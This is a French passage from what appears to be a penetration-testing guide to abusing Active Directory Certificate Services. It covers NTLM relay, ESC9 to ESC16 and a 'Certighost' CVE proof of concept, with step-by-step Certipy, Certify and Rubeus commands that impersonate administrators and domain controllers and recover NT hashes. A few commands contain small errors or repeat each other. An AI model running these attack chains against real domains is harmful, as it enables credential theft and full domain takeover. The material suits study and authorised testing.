#### Abus avec Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abus avec [Certipy](https://github.com/ly4k/Certipy)

La demande de certificat est effectuée par défaut par Certipy sur la base du template `Machine` ou `User`, selon que le nom du compte dont l’authentification est relayée se termine ou non par `$`. La spécification d’un autre template peut être effectuée à l’aide du paramètre `-template`.

Une technique comme [PetitPotam](https://github.com/ly4k/PetitPotam) peut ensuite être utilisée pour forcer l’authentification. Lorsqu’il s’agit de domain controllers, il est nécessaire de spécifier `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explication

La nouvelle valeur **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) pour **`msPKI-Enrollment-Flag`**, désignée par ESC9, empêche l'intégration de la **nouvelle extension de sécurité `szOID_NTDS_CA_SECURITY_EXT`** dans un certificat. Ce flag devient pertinent lorsque `StrongCertificateBindingEnforcement` est défini sur `1` (paramètre par défaut), contrairement à une valeur de `2`. Sa pertinence est renforcée dans les scénarios où un mapping de certificat plus faible pour Kerberos ou Schannel pourrait être exploité (comme dans ESC10), puisque l'absence d'ESC9 ne modifierait pas les exigences.<sup>[[7]](#references)</sup>

Les conditions dans lesquelles la configuration de ce flag devient significative sont les suivantes :

- `StrongCertificateBindingEnforcement` n'est pas défini sur `2` (la valeur par défaut étant `1`), ou `CertificateMappingMethods` inclut le flag `UPN`.
- Le certificat est marqué avec le flag `CT_FLAG_NO_SECURITY_EXTENSION` dans le paramètre `msPKI-Enrollment-Flag`.
- Un EKU d'authentification client est spécifié par le certificat.
- Des permissions `GenericWrite` sont disponibles sur un compte quelconque afin d'en compromettre un autre.

### Scénario d'abus

Supposons que `John@corp.local` dispose de permissions `GenericWrite` sur `Jane@corp.local`, avec pour objectif de compromettre `Administrator@corp.local`. Le template de certificat `ESC9`, auquel `Jane@corp.local` est autorisée à s'inscrire, est configuré avec le flag `CT_FLAG_NO_SECURITY_EXTENSION` dans son paramètre `msPKI-Enrollment-Flag`.

Initialement, le hash de `Jane` est obtenu à l'aide de Shadow Credentials, grâce au `GenericWrite` de `John` :
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Par la suite, le `userPrincipalName` de `Jane` est modifié en `Administrator`, en omettant volontairement la partie de domaine `@corp.local` :
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Cette modification ne viole pas les contraintes, puisque `Administrator@corp.local` reste distinct du `userPrincipalName` de `Administrator`.

Ensuite, le modèle de certificat `ESC9`, marqué comme vulnérable, est demandé en tant que `Jane` :
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Il est à noter que le `userPrincipalName` du certificat correspond à `Administrator`, sans aucun « object SID ».

Le `userPrincipalName` de `Jane` est ensuite rétabli à sa valeur d’origine, `Jane@corp.local` :
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
La tentative d’authentification avec le certificat délivré renvoie maintenant le NT hash de `Administrator@corp.local`. La commande doit inclure `-domain <domain>` en raison de l’absence de spécification du domaine dans le certificat :
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Mappings de certificats faibles - ESC10

### Explication

Deux valeurs de clés de registre sur le contrôleur de domaine sont référencées par ESC10 :

- La valeur par défaut de `CertificateMappingMethods` sous `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` est `0x18` (`0x8 | 0x10`), auparavant définie sur `0x1F`.
- Le paramètre par défaut de `StrongCertificateBindingEnforcement` sous `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` est `1`, auparavant `0`.<sup>[[7]](#references)</sup>

**Cas 1**

Lorsque `StrongCertificateBindingEnforcement` est configuré sur `0`.

**Cas 2**

Si `CertificateMappingMethods` inclut le bit `UPN` (`0x4`).

### Cas d’abus 1

Avec `StrongCertificateBindingEnforcement` configuré sur `0`, un compte A disposant des permissions `GenericWrite` peut être exploité pour compromettre n’importe quel compte B.

Par exemple, en disposant des permissions `GenericWrite` sur `Jane@corp.local`, un attaquant cherche à compromettre `Administrator@corp.local`. La procédure reprend celle d’ESC9, ce qui permet d’utiliser n’importe quel certificate template.

Initialement, le hash de `Jane` est récupéré à l’aide de Shadow Credentials, en exploitant `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Par la suite, le `userPrincipalName` de `Jane` est modifié en `Administrator`, en omettant délibérément la partie `@corp.local` afin d’éviter une violation de contrainte.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Suite à cela, un certificat permettant l’authentification du client est demandé en tant que `Jane`, à l’aide du modèle `User` par défaut.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Le `userPrincipalName` de `Jane` est ensuite rétabli à sa valeur d'origine, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
L’authentification avec le certificat obtenu renverra le hash NT de `Administrator@corp.local`, ce qui nécessite de spécifier le domaine dans la commande en raison de l’absence d’informations sur le domaine dans le certificat.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Cas d'abus 2

Avec `CertificateMappingMethods` contenant le bit flag `UPN` (`0x4`), un compte A disposant des permissions `GenericWrite` peut compromettre tout compte B dépourvu de propriété `userPrincipalName`, notamment les comptes machine et le compte administrateur de domaine intégré `Administrator`.

Ici, l'objectif est de compromettre `DC$@corp.local`, en commençant par obtenir le hash de `Jane` grâce à Shadow Credentials, en exploitant `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Le `userPrincipalName` de `Jane` est alors défini sur `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Un certificat d’authentification client est demandé en tant que `Jane` à l’aide du modèle `User` par défaut.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Le `userPrincipalName` de `Jane` est rétabli à sa valeur d’origine après ce processus.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Pour s’authentifier via Schannel, l’option `-ldap-shell` de Certipy est utilisée, indiquant que l’authentification a réussi en tant que `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Via le shell LDAP, des commandes telles que `set_rbcd` permettent de mener des attaques de Resource-Based Constrained Delegation (RBCD), ce qui peut potentiellement compromettre le domain controller.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Cette vulnérabilité s’étend également à tout compte utilisateur dépourvu de `userPrincipalName` ou dont la valeur ne correspond pas à `sAMAccountName`, le compte `Administrator@corp.local` par défaut étant une cible privilégiée en raison de ses privilèges LDAP élevés et de l’absence de `userPrincipalName` par défaut.

## Relaying NTLM to ICPR - ESC11

### Explanation

Si le CA Server n’est pas configuré avec `IF_ENFORCEENCRYPTICERTREQUEST`, il est possible d’effectuer des attaques NTLM relay sans signature via le service RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Vous pouvez utiliser `certipy` pour vérifier si `Enforce Encryption for Requests` est Disabled ; certipy indiquera alors les Vulnerabilities `ESC11`.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scénario d’abus

Il est nécessaire de configurer un serveur de relais :
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Note : Pour les domain controllers, nous devons spécifier `-template` dans DomainController.

Ou en utilisant le [fork d'impacket de sploutchy](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Accès shell à une CA ADCS avec YubiHSM - ESC12

### Explication

Les administrateurs peuvent configurer la Certificate Authority afin de stocker sa clé sur un périphérique externe comme le « Yubico YubiHSM2 ».

Si le périphérique USB est connecté au serveur CA via un port USB, ou à un USB device server lorsque le serveur CA est une machine virtuelle, une clé d'authentification (parfois appelée « mot de passe ») est requise par le Key Storage Provider pour générer et utiliser des clés dans le YubiHSM.

Cette clé/ce mot de passe est stocké en clair dans le registre, sous `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.

Référence [ici](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Scénario d'abus

Si la clé privée de la CA est stockée sur un périphérique USB physique et que vous obtenez un accès shell, il est possible de la récupérer.

Tout d'abord, vous devez obtenir le certificat de la CA (il est public), puis :
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Enfin, utilisez la commande `certutil -sign` pour forger un nouveau certificat arbitraire à l’aide du certificat de l’AC et de sa clé privée.

## OID Group Link Abuse - ESC13

### Explication

L’attribut `msPKI-Certificate-Policy` permet d’ajouter la policy d’émission au certificate template. Les objets `msPKI-Enterprise-Oid` responsables de l’émission des policies peuvent être découverts dans le Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) du conteneur PKI OID. Une policy peut être liée à un groupe AD à l’aide de l’attribut `msDS-OIDToGroupLink` de cet objet, permettant à un système d’autoriser un utilisateur qui présente le certificat comme s’il était membre du groupe. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

En d’autres termes, lorsqu’un utilisateur dispose de l’autorisation d’enroll un certificat et que le certificat est lié à un groupe OID, l’utilisateur peut hériter des privilèges de ce groupe.

Utilisez [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) pour trouver OIDToGroupLink :
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scénario d’abus

Trouvez une permission utilisateur à l’aide de `certipy find` ou de `Certify.exe find /showAllPermissions`.

Si `John` dispose de la permission de s’inscrire à `VulnerableTemplate`, l’utilisateur peut hériter des privilèges du groupe `VulnerableGroup`.

Il lui suffit de spécifier le template pour obtenir un certificat avec les droits `OIDToGroupLink`.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Configuration vulnérable du renouvellement de certificat - ESC14

### Explication

La description disponible à l’adresse https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping est remarquablement détaillée. Vous trouverez ci-dessous une citation du texte original.<sup>[[14]](#references)</sup>

ESC14 concerne les vulnérabilités résultant d’un « weak explicit certificate mapping », principalement en raison de l’utilisation abusive ou de la configuration non sécurisée de l’attribut `altSecurityIdentities` sur les comptes utilisateur ou ordinateur Active Directory. Cet attribut multivalué permet aux administrateurs d’associer manuellement des certificats X.509 à un compte AD à des fins d’authentification. Lorsque ces associations explicites sont définies, elles peuvent remplacer la logique de mapping par défaut des certificats, qui repose généralement sur les UPN ou les noms DNS présents dans le SAN du certificat, ou sur le SID intégré dans l’extension de sécurité `szOID_NTDS_CA_SECURITY_EXT`.

Un mapping « faible » se produit lorsque la valeur de chaîne utilisée dans l’attribut `altSecurityIdentities` pour identifier un certificat est trop large, facilement devinable, repose sur des champs de certificat non uniques ou utilise des composants de certificat facilement usurpables. Si un attaquant peut obtenir ou créer un certificat dont les attributs correspondent à un mapping explicite faible d’un compte privilégié, il peut utiliser ce certificat pour s’authentifier en tant que ce compte et usurper son identité.

Exemples de chaînes de mapping `altSecurityIdentities` potentiellement faibles :

- Mapping basé uniquement sur un Common Name (CN) courant du Subject : par exemple, `X509:<S>CN=SomeUser`. Un attaquant pourrait être en mesure d’obtenir un certificat avec ce CN depuis une source moins sécurisée.
- Utilisation de Distinguished Names (DN) d’Issuer ou de Subject trop génériques, sans qualification supplémentaire telle qu’un numéro de série spécifique ou un subject key identifier : par exemple, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Utilisation d’autres modèles prévisibles ou d’identifiants non cryptographiques qu’un attaquant pourrait être en mesure de reproduire dans un certificat qu’il peut obtenir légitimement ou forger (s’il a compromis une CA ou trouvé un template vulnérable comme dans ESC1).

L’attribut `altSecurityIdentities` prend en charge différents formats de mapping, tels que :

- `X509:<I>IssuerDN<S>SubjectDN` (mapping basé sur les DN complets de l’Issuer et du Subject)
- `X509:<SKI>SubjectKeyIdentifier` (mapping basé sur la valeur de l’extension Subject Key Identifier du certificat)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapping basé sur le numéro de série, implicitement qualifié par le DN de l’Issuer) - il ne s’agit pas d’un format standard ; il s’agit généralement de `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapping basé sur un nom RFC822, généralement une adresse e-mail, provenant du SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapping basé sur un hash SHA1 de la clé publique brute du certificat - généralement robuste)

La sécurité de ces mappings dépend fortement de la précision, de l’unicité et de la robustesse cryptographique des identifiants de certificat choisis dans la chaîne de mapping. Même lorsque des modes de liaison forte des certificats sont activés sur les Domain Controllers (qui affectent principalement les mappings implicites basés sur les UPN/DNS du SAN et l’extension SID), une entrée `altSecurityIdentities` mal configurée peut toujours constituer un chemin direct vers l’usurpation d’identité si la logique de mapping elle-même est défectueuse ou trop permissive.

### Scénario d’abus

ESC14 cible les **explicit certificate mappings** dans Active Directory (AD), plus précisément l’attribut `altSecurityIdentities`. Si cet attribut est défini (intentionnellement ou à cause d’une mauvaise configuration), les attaquants peuvent usurper l’identité de comptes en présentant des certificats correspondant au mapping.

#### Scénario A : l’attaquant peut écrire dans `altSecurityIdentities`

**Précondition** : l’attaquant dispose des permissions d’écriture sur l’attribut `altSecurityIdentities` du compte cible, ou de la permission de les accorder sous la forme de l’une des permissions suivantes sur l’objet AD cible :
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Scénario B : la cible possède un mapping faible via X509RFC822 (e-mail)

- **Précondition** : la cible possède un mapping X509RFC822 faible dans altSecurityIdentities. Un attaquant peut définir l’attribut mail de la victime pour qu’il corresponde au nom X509RFC822 de la cible, inscrire un certificat en tant que victime et l’utiliser pour s’authentifier en tant que cible.

#### Scénario C : la cible possède un mapping X509IssuerSubject

- **Précondition** : la cible possède un mapping explicite X509IssuerSubject faible dans `altSecurityIdentities`.L’attaquant peut définir l’attribut `cn` ou `dNSHostName` d’un principal victime afin qu’il corresponde au subject du mapping X509IssuerSubject de la cible. L’attaquant peut ensuite inscrire un certificat en tant que victime et utiliser ce certificat pour s’authentifier en tant que cible.

#### Scénario D : la cible possède un mapping X509SubjectOnly

- **Précondition** : la cible possède un mapping explicite X509SubjectOnly faible dans `altSecurityIdentities`. L’attaquant peut définir l’attribut `cn` ou `dNSHostName` d’un principal victime afin qu’il corresponde au subject du mapping X509SubjectOnly de la cible. L’attaquant peut ensuite inscrire un certificat en tant que victime et utiliser ce certificat pour s’authentifier en tant que cible.

### opérations concrètes
#### Scénario A

Demander un certificat du certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Enregistrer et convertir le certificat
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
S'authentifier (à l'aide du certificat)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Nettoyage (facultatif)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Pour des méthodes d'attaque plus spécifiques dans différents scénarios d'attaque, veuillez consulter la ressource suivante : [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Explication

La description disponible à l'adresse https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc est particulièrement détaillée. Vous trouverez ci-dessous une citation du texte original.<sup>[[15]](#references)</sup>

En utilisant les modèles de certificats de version 1 par défaut intégrés, un attaquant peut concevoir un CSR afin d'y inclure des stratégies d'application prioritaires par rapport aux attributs Extended Key Usage configurés dans le modèle. Le seul prérequis est de disposer des droits d'enrollment, et cette technique peut être utilisée pour générer des certificats d'authentification client, d'agent de demande de certificat et de codesigning à l'aide du modèle **_WebServer_**

### Abuse

La [documentation de privilege-escalation de Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) contient des exemples d'utilisation plus détaillés.<sup>[[14]](#references)</sup>


La commande `find` de Certipy peut aider à identifier les modèles V1 potentiellement vulnérables à ESC15 si la CA n'a pas été corrigée.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A : Direct Impersonation via Schannel

**Étape 1 : Demander un certificat en injectant la stratégie d’application "Client Authentication" et l’UPN cible.** L’attaquant `attacker@corp.local` vise `administrator@corp.local` à l’aide du template V1 "WebServer" (qui autorise le sujet fourni par l’enrollee).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Le template V1 vulnérable avec « Enrollee supplies subject ».
- `-application-policies 'Client Authentication'`: Injecte l’OID `1.3.6.1.5.5.7.3.2` dans l’extension Application Policies du CSR.
- `-upn 'administrator@corp.local'`: Définit l’UPN dans le SAN pour l’usurpation d’identité.

**Étape 2 : S’authentifier via Schannel (LDAPS) à l’aide du certificat obtenu.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scénario B : Impersonation PKINIT/Kerberos via l’abus d’un Enrollment Agent

**Étape 1 : Demander un certificat depuis un template V1 (avec « Enrollee supplies subject »), en injectant l’Application Policy « Certificate Request Agent ».** Ce certificat est destiné à l’attaquant (`attacker@corp.local`) afin qu’il devienne un enrollment agent. Aucun UPN n’est spécifié pour l’identité propre de l’attaquant ici, car l’objectif est d’obtenir la capacité d’agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Injecte l’OID `1.3.6.1.4.1.311.20.2.1`.

**Étape 2 : Utiliser le certificat "agent" pour demander un certificat au nom d’un utilisateur privilégié ciblé.** Il s’agit d’une étape similaire à ESC3, utilisant le certificat de l’Étape 1 comme certificat d’agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Étape 3 : S’authentifier en tant qu’utilisateur privilégié à l’aide du certificat « on-behalf-of ».**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Extension de sécurité désactivée sur la CA (globalement)-ESC16

### Explication

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** désigne le scénario dans lequel, si la configuration d’AD CS n’impose pas l’inclusion de l’extension **szOID_NTDS_CA_SECURITY_EXT** dans tous les certificats, un attaquant peut l’exploiter en :

1. Demandant un certificat **sans liaison SID**.

2. Utilisant ce certificat **pour s’authentifier en tant que n’importe quel compte**, par exemple en usurpant un compte disposant de privilèges élevés (tel qu’un Domain Administrator).

Vous pouvez également consulter cet article pour en savoir plus sur le principe détaillé :https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Exploitation

Les informations suivantes proviennent de [ce lien](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), cliquez pour consulter des méthodes d’utilisation plus détaillées.<sup>[[14]](#references)</sup>

Pour identifier si l’environnement Active Directory Certificate Services (AD CS) est vulnérable à **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Étape 1 : Lire l’UPN initial du compte victime (Facultatif - pour restauration).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Étape 2 : Mettez à jour l’UPN du compte victime avec le `sAMAccountName` de l’administrateur cible.
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Étape 3 : (Si nécessaire) Obtenir des identifiants pour le compte « victim » (par exemple via Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Étape 4 : Demandez un certificat en tant qu’utilisateur « victime » à partir de _n’importe quel template d’authentification client approprié_ (par exemple, « User ») sur la CA vulnérable à ESC16.** Comme la CA est vulnérable à ESC16, elle omettra automatiquement l’extension de sécurité SID du certificat émis, quels que soient les paramètres spécifiques du template pour cette extension. Définissez la variable d’environnement du cache d’identifiants Kerberos (commande shell) :
```bash
export KRB5CCNAME=victim.ccache
```
Ensuite, demandez le certificat :
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Étape 5 : Rétablir l’UPN du compte « victim ».**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Étape 6 : S’authentifier en tant qu’administrateur cible.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Substitution d'identité via callback de type Rogue LDAP/LSA chase (Certighost / CVE-2026-54121)

### Explication

**Certighost** exploite un **chemin d'enrollment chase / callback d'AD CS** dans lequel la CA fait confiance aux attributs de requête fournis par le demandeur pour déterminer l'identité à placer dans le certificat délivré. Dans le PoC public, la requête forgée inclut :<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`** : hôte/IP contrôlé par l'attaquant que la CA contactera
- **`rmd`** : **nom DNS du Domain Controller cible** à usurper

Si la CA suit ce chase, elle se connectera à l'attaquant via **SMB/LSA (`445`)** et **LDAP (`389`)**. L'attaquant utilise un **vrai compte machine** (généralement créé via le **`ms-DS-MachineAccountQuota`** par défaut) afin que la session callback s'authentifie comme un principal de domaine valide, tandis que les services rogue renvoient les attributs d'identité du **DC cible** à la place :

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Si la CA **n'associe pas cryptographiquement l'identité renvoyée au principal callback authentifié**, elle peut délivrer un certificat pour le **Domain Controller**, même si la session s'est authentifiée avec le compte machine contrôlé par l'attaquant. Cela rend le bug conceptuellement différent de **Certifried** : au lieu de réécrire des attributs AD tels que `dNSHostName`, l'attaquant **substitue les données d'identité lors de la résolution du callback de la CA**.<sup>[[2]](#references)</sup>

**Préconditions utiles :**

- **Identifiants de domaine** avec faibles privilèges
- Capacité à **créer ou réutiliser un compte ordinateur**
- Accessibilité réseau depuis la **CA** vers les **ports `389` et `445`** contrôlés par l'attaquant
- Chemin de requête de CA vulnérable / non corrigé (la mise à jour Microsoft du **14 juillet 2026** a ajouté une **validation du DC pour `cdc`**, ainsi qu'une **comparaison du SID résolu**)

Le **`.pfx`** obtenu peut ensuite être utilisé pour **PKINIT**, afin de produire un **`.ccache`** et, dans le workflow du PoC publié, le **NT hash du DC cible**, ce qui suffit généralement à obtenir une **compromission complète du domaine**.

### Exploitation

Le PoC public automatise la chaîne complète :<sup>[[1]](#references)</sup>

1. Créer ou réutiliser un **compte machine** contrôlé par l'attaquant.
2. Démarrer des **listeners LDAP et SMB/LSA rogue** sur les ports `389` et `445`.
3. Soumettre une requête de certificat contenant les attributs **`cdc`** contrôlé par l'attaquant et **`rmd`** correspondant à la cible.
4. Laisser la CA s'authentifier auprès des listeners rogue avec le compte machine contrôlé, puis répondre aux recherches d'identité avec les attributs du **DC cible**.
5. Recevoir un **certificat de DC** signé par la CA, puis l'utiliser pour **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Indicateurs runtime utiles du PoC :

- `--listener <ip>` : choisit explicitement l’IP de callback annoncée dans `cdc`
- `--computer-name <NAME$>` : réutilise un compte machine existant au lieu d’en créer un nouveau

**Notes opérationnelles :**

- Le PoC nécessite **root** car il se lie aux **ports privilégiés** `389` et `445`.
- Une exploitation réussie écrit localement un **DC `.pfx`** et un **Kerberos `.ccache`**.
- Comme le certificat est associé à un **compte Domain Controller**, les actions suivantes peuvent inclure une **authentification Kerberos basée sur un certificat**, **DCSync** et la réutilisation du **machine NT hash** récupéré.<sup>[[2]](#references)</sup>

## Enrôlement de machine IIS AppPool vers l’Administrator du même hôte

Un pool IIS exécuté sous `ApplicationPoolIdentity` utilise le **computer account** de son hôte pour accéder aux ressources réseau. Par conséquent, une exécution de code en tant que `IIS AppPool\<POOL>` reste faiblement privilégiée dans le token local, mais peut soumettre une requête AD CS que la CA authentifie en tant que `HOST$` ; il s’agit d’une transition d’identité sortante, et non d’une usurpation de token ou d’une élévation locale de type Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Cette chaîne nécessite un hôte IIS joint au domaine, une Enterprise CA accessible via RPC, un template d’authentification machine publié pour lequel l’ordinateur dispose de droits d’enrollment, la prise en charge de PKINIT, ainsi qu’une accessibilité KDC/SMB. Une identité de pool personnalisée modifie le principal sortant ; vérifiez donc que le pool utilise bien `ApplicationPoolIdentity` avant de supposer qu’il s’agit de `HOST$`.<sup>[[19]](#references)[[20]](#references)</sup>

### Enrôlement avec une clé contrôlée par l’attaquant

